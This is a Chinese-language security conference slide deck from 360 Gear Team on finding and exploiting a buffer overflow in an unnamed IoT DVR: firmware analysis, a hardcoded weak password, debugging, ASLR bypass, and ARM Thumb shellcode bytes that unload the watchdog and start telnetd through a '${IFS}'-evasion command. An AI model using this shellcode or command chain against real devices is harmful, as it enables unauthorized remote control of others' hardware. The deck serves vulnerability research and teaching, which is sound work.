From Dvr to See 
Exploit of IoT Device
0K5y
Nobody@360GearTeam
1559113201 Date
Larryxi
Nobody@360GearTeam
What’s time
0x00 目录
0x01 前言闲谈
0x02 漏洞挖掘
0x03 环境调试
0x04 漏洞利用
0x05 总结反思
0x01 前言闲谈
有朋自远方来
IoT 四层模型
IoT 现状问题
IoT 利用架构
IoT 攻击思维
0x02 漏洞挖掘
环境前瞻
获取固件的十种方法
软件层面
硬件层面
前瞻发现
`etc/init.d/S99` 中注释掉了`telnetd` 
`/etc/passwd` 中存在硬编码弱口令
`file /bin/busybox` 可知架构为 armel
一般思路
Web端命令注入或者通过溢出远程代码执行
寻找相关shell口并使用弱口令登录
0x02 漏洞挖掘
Web 漏洞
虽有登录失败重定向，但在burp中能看到后台静态资源
身份在url中传递，实时动态获取后端资源
有些cgi存在未授权访问，可得到相关配置文件
有些cgi可执行特定的指令，如reboot
并无卵用
0x02 漏洞挖掘
缓冲区溢出
0x02 漏洞挖掘
缓冲区溢出
0x03 调试环境
获取调试接口
没有命令注入也就无法得到shell进行远程调试
虽有UART接口但只输出日志信息
通过修改u-boot的init参数，没有实际效果
面临问题
REPACKING
0x03 调试环境
获取调试接口
Round One
0x03 调试环境
获取调试接口
Round Two
0x03 调试环境
获取调试接口
Fight
0x03 调试环境
交叉编译环境
gdbserver-7.7 + gdb-multiarch-7.12 = 踩坑
gdbserver-7.11 + gdb-multiarch-7.12 = 真香
0x04 漏洞利用
安全机制
No GS
No NX
ASLR 为1, uClibc 地址确实被随机化
Vectors 段的地址是固定的
Watchdog 以内核模块的形式存在
0x04 漏洞利用
安全机制
0x04 漏洞利用
利用方案
在函数返回之前得到异
常报错
strcasestr 的haystack参
数被payload中数据覆盖
使用vectors段中可读的
固定地址
0x04 漏洞利用
利用方案
由于截断, 无法在代码段找到完美的 one-gadget
在vectors 段中寻找gadget也是收效甚微
0x04 漏洞利用
利用方案
绕过 ASLR
Information leak: http响应信息限制得比较死，不像串口
会输出串口信息
Violent hacking: 程序打崩后watchdog就重启系统
Heap spray: 可以尝试一下多线程的处理效果，希望不大
0x04 漏洞利用
利用方案
逆向Http处理过程
0x04 漏洞利用
利用方案
逆向Http处理过程
0x04 漏洞利用
利用方案
重视漏洞环境
0x04 漏洞利用
利用方案
Two Pops Jump to `GET /cgi-bin/xxx.cgi?p=xxx HTTP/1.1\r\n`
0x04 漏洞利用
Shellcode 构造
Badchar and Nop
`\x00\x0d\x0a\x20`and `GETB`
0x04 漏洞利用
Shellcode 构造
Play With Execve
#include 
int main(void) {
execve("/bin/sh", 0, 0);
return 0;
}
#include 
int main(void) {
char* argv[] = {"busybox", "rmmod", "wdt", 0};
execve("/bin/busybox", argv, 0);
return 0;
}
0x04 漏洞利用
Shellcode 构造
Learn From Pwnlib
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x786f6279           \x79\x62\x6f\x78  ybox
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x7375622f           \x2f\x62\x75\x73  /bus
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6e69622f           \x2f\x62\x69\x6e  /bin
push {r7}            \x80\xb4
mov r0, sp
\x68\x46
mov r7, #0x74        \x4f\xf0\x74\x07  t
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x64770064           \x64\x00\x77\x64  d\x00wd
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6f6d6d72           \x72\x6d\x6d\x6f  rmmo
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0xff786f62           \x62\x6f\x78\xff
box\xff
lsl.w r7, r7, #8     \x4f\xea\x07\x27
lsr.w r7, r7, #8     \x4f\xea\x17\x27  box\x00
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x79737562           \x62\x75\x73\x79  busy
push {r7}            \x80\xb4
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
mov.w r1, #0x12      \x4f\xf0\x12\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0x10      \x4f\xf0\x10\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0xc       \x4f\xf0\x0c\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov r1, sp
\x69\x46
eor.w r2, r2, r2     \x82\xea\x02\x02
mov.w r7, #0xb       \x4f\xf0\x0b\x07
svc #0x41            \x41\xdf
0x04 漏洞利用
Shellcode 构造
Learn From Pwnlib
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x786f6279           \x79\x62\x6f\x78  ybox
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x7375622f           \x2f\x62\x75\x73  /bus
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6e69622f           \x2f\x62\x69\x6e  /bin
push {r7}            \x80\xb4
mov r0, sp
\x68\x46
mov.w r7, #0x64      \x4f\xf0\x64\x07  d
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0x6f6d6d72           \x72\x6d\x6d\x6f  rmmo
push {r7}            \x80\xb4
ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
b #6                 \x01\xe0
0xff786f62           \x77\x64\x74\xff
wdt\xff
lsl.w r7, r7, #8     \x4f\xea\x07\x27
lsr.w r7, r7, #8     \x4f\xea\x17\x27  wdt\x00
push {r7}            \x80\xb4
eor.w r7, r7, r7     \x87\xea\x07\x07
push {r7}            \x80\xb4
mov.w r1, #0x4       \x4f\xf0\x04\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0xc       \x4f\xf0\x0c\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov.w r1, #0x1d      \x4f\xf0\x1d\x01
add r1, sp, r1       \x69\x44
push {r1}            \x02\xb4
mov r1, sp
\x69\x46
eor.w r2, r2, r2     \x82\xea\x02\x02
mov.w r7, #0xb       \x4f\xf0\x0b\x07
svc #0x41            \x41\xdf
0x04 漏洞利用
完成利用
Write Script to `sh`
#include 
#include 
#include 
#include 
#include 
void main() {
int fd = open("/tmp/XXX", O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
write(fd, "rmmod${IFS}wdt;telnetd", 22);
close(fd);
}
Video
0x05 总结反思
IoT 漏洞倒逼尝试的安全意识
攻击思路是类似的但不应该是受限的
攻击看结果，防御看过程
From Dvr to See 
Exploit of IoT Device
Sina@Larryxi
Larryxi
PI:EMAIL